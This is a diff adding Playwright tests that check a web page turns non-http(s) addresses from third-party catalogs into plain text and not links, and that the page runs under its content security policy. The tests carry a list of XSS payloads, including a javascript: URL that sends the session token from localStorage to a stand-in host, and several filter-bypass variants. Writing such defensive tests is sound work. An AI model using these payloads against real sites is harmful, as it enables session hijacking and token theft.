@@ -378,3 +378,101 @@ def test_the_absence_of_a_restaurant_receipt_is_explained_not_left_blank(page):
     text = page.inner_text("#receipts")
     assert "Not fetched on this run" not in text
     assert "every named person has" in text
+
+
+# ── links built from other organisations' data ──────────────────────────────
+#
+# The page runs on nandaindex.org, where the web app keeps its session token.
+# An address from a third party's catalog that became a javascript: link would
+# run there when clicked.
+
+_UNSAFE = [
+    "javascript:fetch('//x/?'+localStorage.nanda_auth_token)",
+    " JavaScript:alert(1)",
+    "java\tscript:alert(1)",
+    "data:text/html,<script>alert(1)</script>",
+    "vbscript:msgbox(1)",
+    "/relative/path",
+    "",
+]
+
+
+def test_safe_href_admits_only_http_and_https(page):
+    verdicts = page.evaluate(
+        "(xs) => xs.map(u => safeHref(u))",
+        [*_UNSAFE, "https://a.test/x?y=1", "http://a.test:8080/"],
+    )
+    assert verdicts[: len(_UNSAFE)] == [""] * len(_UNSAFE)
+    assert verdicts[len(_UNSAFE) :] == ["https://a.test/x?y=1", "http://a.test:8080/"]
+
+
+def test_a_non_web_address_in_a_search_result_is_shown_as_text_not_a_link(page):
+    import json
+
+    hostile = {
+        "capability": "leadership",
+        "matches": [
+            {
+                "org": "evil",
+                "identifier": f"agent-{n}",
+                "display_name": f"Agent {n}",
+                "url": address,
+                "skills": ["leadership"],
+                "tags": ["leadership"],
+                "source": "org",
+                "catalog_url": "",
+                "facts_url": "",
+            }
+            for n, address in enumerate(_UNSAFE[:5])
+        ]
+        + [
+            {
+                "org": "fine",
+                "identifier": "ok",
+                "display_name": "Ok",
+                "url": "https://ok.test/card.json",
+                "skills": ["leadership"],
+                "tags": ["leadership"],
+                "source": "agent",
+                "catalog_url": "",
+                "facts_url": "",
+            }
+        ],
+        "searched": ["evil", "fine"],
+        "unreachable": {},
+        "complete": True,
+        "orgs_claiming": ["evil", "fine"],
+        "divergences": [],
+        "unverified": {},
+    }
+    page.route(
+        "**/capability?*",
+        lambda route: route.fulfill(status=200, content_type="application/json", body=json.dumps(hostile)),
+    )
+    page.click("#t-refs")
+    page.fill("#cap-q", "leadership")
+    page.click("#cap-go")
+    page.wait_for_selector(".caprow", timeout=15000)
+
+    hrefs = page.eval_on_selector_all("#cap-results a", "as => as.map(a => a.getAttribute('href'))")
+    assert hrefs == ["https://ok.test/card.json"]
+    assert "localStorage.nanda_auth_token" in page.inner_text("#cap-results"), "the address is still shown"
+    assert not page.errors, page.errors
+
+
+def test_the_page_runs_under_its_content_security_policy(page):
+    """The policy admits the page's own script by hash. If it did not, nothing
+    on the page would work — so a working page is the assertion, plus no
+    violation reported."""
+    response = page.request.get(page.url)
+    assert "content-security-policy" in response.headers
+    violations = page.evaluate(
+        """() => new Promise(resolve => {
+      const seen = [];
+      document.addEventListener('securitypolicyviolation', e => seen.push(e.violatedDirective));
+      document.getElementById('t-refs').click();
+      setTimeout(() => resolve(seen), 500);
+    })"""
+    )
+    assert violations == []
+    assert page.evaluate("typeof safeHref") == "function", "the inline script did not run"
